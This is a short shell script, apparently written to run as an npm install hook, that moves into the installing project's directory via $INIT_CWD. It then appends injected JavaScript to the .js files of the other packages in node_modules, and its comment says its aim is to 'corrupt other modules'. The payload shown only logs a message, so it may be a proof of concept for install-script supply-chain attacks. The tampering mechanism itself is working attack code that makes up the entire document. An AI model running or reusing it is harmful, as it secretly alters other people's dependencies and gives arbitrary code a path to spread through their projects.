# navigate to project dir
cd $INIT_CWD;

# corrupt other modules
for file in ./node_modules/*/*.js; do
  echo '\n;console.log("module has been corrupted");\n' >> "$file"
done
